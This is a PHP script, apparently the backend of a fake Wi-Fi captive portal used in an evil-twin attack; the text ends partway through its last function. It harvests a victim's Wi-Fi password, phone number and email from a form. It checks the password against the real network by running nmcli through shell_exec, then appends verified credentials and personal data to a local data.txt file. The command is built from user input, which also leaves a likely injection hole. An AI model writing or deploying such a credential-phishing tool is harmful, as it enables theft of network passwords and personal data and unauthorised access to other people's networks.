<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // get form data
    $name = $_POST['name'] ?? '';
    $passwd = $_POST['passwd'] ?? '';
    $cipher = $_POST['cipher'] ?? '';
    $device = $_POST['device'] ?? '';
    $tel = $_POST['tel'] ?? '';
    $email = $_POST['email'] ?? '';
    $problem = $_POST['problem'] ?? '';

    // Log received data
    error_log("Received data: " . print_r($_POST, true));
    
    // validate wifi password
    if (!validateWifiPassword($name, $passwd)) {
        // If verification fails
        error_log("Validation failed for SSID: $name, Password: $passwd");
        header("Location: http://10.0.0.1:7000/php/bad.php");
        exit(); // kill the process
    } 
    
    // if password is correct, save all data
    $data = "WiFi Network Name: " . htmlspecialchars($name) . "\n" .
            "Password: " . htmlspecialchars($passwd) . "\n" . 
            "Encryption: " . htmlspecialchars($cipher) . "\n" . 
            "Device: " . htmlspecialchars($device) . "\n" . 
            "Phone: " . htmlspecialchars($tel) . "\n" . 
            "Email: " . htmlspecialchars($email) . "\n" . 
            "Problem: " . nl2br(htmlspecialchars($problem)) . "\n" . 
            "----------\n";

    // In a file called data.txt
    file_put_contents('data.txt', $data, FILE_APPEND);

    // And redirect to redirect.php
    header("Location: http://10.0.0.1:7000/php/redirect.php");
    exit(); // Ensure the process stops
}

// function to verify wifi password
function validateWifiPassword($ssid, $password) {
    // command to make the verification
    $command = escapeshellcmd("nmcli device wifi connect '$ssid' password '$password'");
    $output = shell_exec($command);
    
    // Log command output
    error_log("Command executed: $command");
    error_log("Output: " . $output);
    
    // Adjust this based on the message you see in the log
    return (strpos($output, 'Activated successfully.') !== false || strpos($output, 'se activó correctamente') !== false);
